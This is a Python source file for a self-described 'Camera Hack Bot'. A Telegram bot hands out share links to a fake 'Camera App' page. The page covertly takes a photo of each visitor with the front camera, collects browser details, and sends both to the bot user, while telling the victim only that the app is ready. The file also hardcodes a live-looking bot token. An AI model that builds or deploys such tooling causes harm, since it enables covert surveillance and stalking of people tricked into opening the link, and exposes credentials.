import logging
import sqlite3
import uuid
import base64
import threading
import os
from datetime import datetime
from flask import Flask, request, jsonify
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Bot Configuration for Render
BOT_TOKEN = os.environ.get('BOT_TOKEN', "8042234265:AAFG0x3pnykw-r4brv6X8Yt7Wco_dbcWqk4")  # YAHAN APNA TOKEN DALDO
PORT = int(os.environ.get('PORT', 5000))

# Database setup for Render
def init_db():
    conn = sqlite3.connect('/tmp/camera_users.db', check_same_thread=False)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            referral_code TEXT UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS photos (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            photo_data TEXT,
            visitor_info TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    conn.commit()
    conn.close()

init_db()

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Telegram Bot Functions
def get_user_referral_code(user_id):
    conn = sqlite3.connect('/tmp/camera_users.db', check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('SELECT referral_code FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    
    if not result:
        referral_code = str(uuid.uuid4())[:8]
        cursor.execute('INSERT INTO users (user_id, referral_code) VALUES (?, ?)', (user_id, referral_code))
        conn.commit()
    else:
        referral_code = result[0]
    
    conn.close()
    return referral_code

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    first_name = update.effective_user.first_name
    
    referral_code = get_user_referral_code(user_id)
    
    # Render URL automatically generate hoga
    camera_link = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'your-app.onrender.com')}/cam/{referral_code}"
    
    welcome_msg = f"""
🔓 **Welcome {first_name}!**

📸 **Camera Hack Bot**

🔗 **Your Camera Hack Link:**
`{camera_link}`

📤 Share this link and get photos automatically!
"""
    
    keyboard = [
        [InlineKeyboardButton("📤 Share Link", url=f"https://t.me/share/url?url={camera_link}&text=📸 Check this amazing camera app!")],
        [InlineKeyboardButton("🔄 New Link", callback_data="new_link")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(welcome_msg, reply_markup=reply_markup, parse_mode='Markdown')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if query.data == "new_link":
        new_code = str(uuid.uuid4())[:8]
        conn = sqlite3.connect('/tmp/camera_users.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('UPDATE users SET referral_code = ? WHERE user_id = ?', (new_code, user_id))
        conn.commit()
        conn.close()
        
        new_link = f"https://{os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'your-app.onrender.com')}/cam/{new_code}"
        await query.edit_message_text(f"🆕 **New Link:**\n`{new_link}`", parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔓 Use /start to get your camera hack link!")

def start_telegram_bot():
    def run_bot():
        try:
            application = Application.builder().token(BOT_TOKEN).build()
            application.add_handler(CommandHandler("start", start))
            application.add_handler(CommandHandler("help", help_command))
            application.add_handler(CallbackQueryHandler(button_handler))
            
            print("🤖 Bot Started!")
            application.run_polling()
        except Exception as e:
            print(f"❌ Bot Error: {e}")
    
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()

# Flask Server
app = Flask(__name__)

@app.route('/')
def home():
    return "📸 Camera Hack Server - Running on Render"

@app.route('/cam/<referral_code>')
def camera_page(referral_code):
    html = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera App</title>
    <style>
        body { background: #000; color: white; font-family: Arial; text-align: center; padding: 20px; margin: 0; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        #camera { width: 100%; max-width: 400px; border-radius: 15px; margin: 20px 0; }
        #status { margin: 10px 0; font-size: 18px; color: #fff; }
        .container { max-width: 500px; width: 100%; }
    </style>
</head>
<body>
    <div class="container">
        <h2>📸 Camera App</h2>
        <div id="status">Loading camera...</div>
        <video id="camera" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        const video = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        const status = document.getElementById('status');

        async function startCamera() {
            try {
                status.textContent = 'Requesting camera access...';
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
                });
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    status.textContent = 'Camera activated...';
                    setTimeout(() => capturePhoto(), 1500);
                };
            } catch (err) {
                status.textContent = 'Please allow camera access';
            }
        }

        function capturePhoto() {
            status.textContent = 'Capturing photo...';
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const photoData = canvas.toDataURL('image/jpeg', 0.8);
            if (video.srcObject) video.srcObject.getTracks().forEach(track => track.stop());
            sendPhotoToServer(photoData);
        }

        function sendPhotoToServer(photoData) {
            const refCode = window.location.pathname.split('/').pop();
            fetch('/save_photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    referral_code: refCode,
                    photo_data: photoData,
                    visitor_info: { userAgent: navigator.userAgent, platform: navigator.platform }
                })
            }).then(r => r.json()).then(data => {
                status.textContent = 'App ready!';
                status.style.color = 'lightgreen';
            }).catch(e => {
                status.textContent = 'App loaded!';
                status.style.color = 'lightgreen';
            });
        }

        window.addEventListener('load', startCamera);
    </script>
</body>
</html>
'''
    return html

@app.route('/save_photo', methods=['POST'])
def save_photo():
    try:
        data = request.json
        referral_code = data.get('referral_code')
        photo_data = data.get('photo_data')
        
        conn = sqlite3.connect('/tmp/camera_users.db', check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM users WHERE referral_code = ?', (referral_code,))
        result = cursor.fetchone()
        
        if result:
            user_id = result[0]
            cursor.execute('INSERT INTO photos (user_id, photo_data) VALUES (?, ?)', (user_id, photo_data))
            conn.commit()
            
            # Send to Telegram
            if photo_data.startswith('data:image'):
                photo_data = photo_data.split(',')[1]
            photo_bytes = base64.b64decode(photo_data)
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            files = {'photo': ('photo.jpg', photo_bytes, 'image/jpeg')}
            data = {'chat_id': user_id, 'caption': '📸 New photo captured!'}
            requests.post(url, files=files, data=data)
            
            conn.close()
            return jsonify({'success': True})
        conn.close()
        return jsonify({'success': False})
    except Exception as e:
        return jsonify({'success': False})

def start_flask():
    print(f"🌐 Server starting on port {PORT}")
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)

if __name__ == '__main__':
    print("🚀 Starting Camera Hack System...")
    start_telegram_bot()
    start_flask()
